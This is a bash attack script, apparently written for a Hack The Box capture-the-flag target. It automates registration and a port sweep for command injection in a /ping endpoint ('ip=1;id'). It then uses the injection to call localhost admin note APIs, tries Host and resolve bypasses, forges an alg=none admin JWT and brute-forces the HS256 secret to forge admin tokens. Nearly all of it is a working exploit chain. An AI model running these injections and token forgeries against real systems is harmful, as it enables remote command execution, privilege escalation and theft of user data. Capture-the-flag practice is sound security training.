#!/usr/bin/env bash
set -euo pipefail
# Usage: run_full_objectives.sh <IP> <PRIMARY_PORT>
IP=${1:?IP}
PRIMARY_PORT=${2:?PRIMARY_PORT}
TO=${3:-8}
BASE_OUT=${4:-/workspace/recon/httpx}
NMAP_FILE=${5:-/workspace/recon/nmap/${IP}_full.nmap}
OUT_DIR="$BASE_OUT/${IP}_${PRIMARY_PORT}"
SWEEP_DIR="$BASE_OUT/${IP}_sweep"
TMP_DIR=/workspace/recon/tmp
mkdir -p "$OUT_DIR" "$SWEEP_DIR" "$TMP_DIR"
API_BASE="http://$IP:$PRIMARY_PORT"
# 1) Register+Login fresh and store token
E=$(date +%s)
EMAIL="a${E}@a.com"; PASS="a"
jq -n --arg email "$EMAIL" --arg password "$PASS" '{email:$email,password:$password}' > "$OUT_DIR/creds.json"
curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$OUT_DIR/creds.json" "$API_BASE/api/auth/register" > "$OUT_DIR/register.json" || true
curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$OUT_DIR/creds.json" "$API_BASE/api/auth/login" > "$OUT_DIR/login.json"
TOKEN=$(jq -r .token "$OUT_DIR/login.json")
printf '%s' "$TOKEN" > "$OUT_DIR/token.txt"
# 2) Extract Node.js Express ports from nmap
if [[ -s "$NMAP_FILE" ]]; then
  NODE_PORTS=$(rg -n "Node\\.js Express framework" -S "$NMAP_FILE" | awk -F: '{print $2}' | awk '{print $1}' | cut -d/ -f1 | sort -n | uniq | tr '\n' ' ')
else
  NODE_PORTS=""
fi
# Always include primary and a few known candidates
NODE_PORTS="$NODE_PORTS $PRIMARY_PORT 32271 33930 44825 46530 48656 50692"
# 3) Hunt /ping RCE across Node ports
: > "$OUT_DIR/rce_ports.txt"
for p in $NODE_PORTS; do
  [[ -z "$p" ]] && continue
  BASE="http://$IP:$p"
  # Probe GET /ping
  curl -fsS -m "$TO" --connect-timeout "$TO" -i "$BASE/ping" > "$SWEEP_DIR/${p}_ping.head" 2>/dev/null || true
  # Probe POST injection to /ping
  RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode 'ip=1;id' "$BASE/ping" || true)
  printf '%s\n' "$RES" | head -n 5 > "$SWEEP_DIR/${p}_ping_inj.txt"
  if echo "$RES" | grep -qiE 'uid=|www-data|linux'; then
    echo "$p" | tee -a "$OUT_DIR/rce_ports.txt"
    # 3a) Pivot to localhost admin endpoints
    printf "ip=1;curl -fsS -H 'Authorization: Bearer %s' 'http://127.0.0.1:%s/api/notes/all'" "$TOKEN" "$PRIMARY_PORT" > "$TMP_DIR/inj_${p}_all.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_${p}_all.txt" "$BASE/ping" > "$OUT_DIR/p${p}_localhost_all.json" || true
    printf "ip=1;curl -fsS -H 'Authorization: Bearer %s' 'http://127.0.0.1:%s/api/notes?all=1'" "$TOKEN" "$PRIMARY_PORT" > "$TMP_DIR/inj_${p}_list.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_${p}_list.txt" "$BASE/ping" > "$OUT_DIR/p${p}_localhost_list.json" || true
    printf "ip=1;curl -fsS -H 'Authorization: Bearer %s' 'http://127.0.0.1:%s/api/auth/verify'" "$TOKEN" "$PRIMARY_PORT" > "$TMP_DIR/inj_${p}_verify.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -s -X POST --data-urlencode "ip@$TMP_DIR/inj_${p}_verify.txt" "$BASE/ping" > "$OUT_DIR/p${p}_localhost_verify.json" || true
  fi
  sleep 0.05
done
# 4) Header/resolve/XFF bypasses (with token)
/bin/bash /workspace/recon/scripts/localhost_bypass_with_token.sh "$IP" "$PRIMARY_PORT" "$OUT_DIR/token.txt" "$TO" "$BASE_OUT" || true
# 5) JWT attempts (none + HS256 quick brute)
# 5a) alg=none attempt
NONE=$(python3 - <<'PY'
import json,base64,time
login=json.load(open('LOGIN'))
h,p,_=login['token'].split('.')
now=int(time.time())
payload={'id':'00000000-0000-0000-0000-000000000001','email':'admin@local','iat':now,'exp':now+3600,'role':'admin','isAdmin':True}
hb=base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
pb=base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).decode().rstrip('=')
print(hb+'.'+pb+'.')
PY
LOGIN="$OUT_DIR/login.json")
printf '%s' "$NONE" > "$OUT_DIR/token_none.txt"
# Try with NONE via plain, Host, resolve
curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $NONE" "$API_BASE/api/notes/all" > "$OUT_DIR/notes_all_none_plain.head" 2>/dev/null || true
curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $NONE" -H 'Host: localhost' "$API_BASE/api/notes/all" > "$OUT_DIR/notes_all_none_hostloc.head" 2>/dev/null || true
curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$PRIMARY_PORT:$IP" -i -H "Authorization: Bearer $NONE" "http://localhost:$PRIMARY_PORT/api/notes/all" > "$OUT_DIR/notes_all_none_resolve.head" 2>/dev/null || true
# 5b) HS256 quick brute
JWT=$(cat "$OUT_DIR/token.txt")
WL="/workspace/recon/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt"
python3 /workspace/recon/scripts/jwt_bruteforce.py "$JWT" "$WL" > "$OUT_DIR/jwt_secret.txt" || true
if [[ -s "$OUT_DIR/jwt_secret.txt" ]]; then
  SECRET=$(head -n1 "$OUT_DIR/jwt_secret.txt")
  echo "$SECRET" > "$OUT_DIR/jwt_secret_used.txt"
  FORGED=$(python3 /workspace/recon/scripts/jwt_forge.py "$JWT" "$SECRET" '{"role":"admin","isAdmin":true,"email":"admin@local"}' || true)
  if [[ -n "$FORGED" ]]; then
    printf '%s' "$FORGED" > "$OUT_DIR/token_forged.txt"
    curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $FORGED" "$API_BASE/api/notes/all" > "$OUT_DIR/notes_all_forged.json" || true
  fi
fi
# 6) FFUF fuzz root/API candidates for ping-like endpoints (limited list)
CAND=/workspace/recon/tmp/ping_candidates.txt
printf '%s\n' ping pingip ping-ip check health status api/ping api/pingip api/ping-ip api/check api/health api/status > "$CAND"
ffuf -w "$CAND" -u "$API_BASE/FUZZ" -ac -mc all -timeout 0 -t 40 -of json -o "$OUT_DIR/ffuf_root_ping.json" || true
ffuf -w "$CAND" -u "$API_BASE/api/FUZZ" -ac -mc all -timeout 0 -t 40 -of json -o "$OUT_DIR/ffuf_api_ping.json" || true
# 7) Harvest and grep for flags across outputs
rg -n "HTB\{[^}]+\}" -S "$OUT_DIR" "$SWEEP_DIR" "$BASE_OUT/bypass_${IP}_${PRIMARY_PORT}" "$BASE_OUT/bypass_94.237.121.49_30497" > "$OUT_DIR/final_htb_hits.txt" || true
sed -n '1,200p' "$OUT_DIR/final_htb_hits.txt" || true
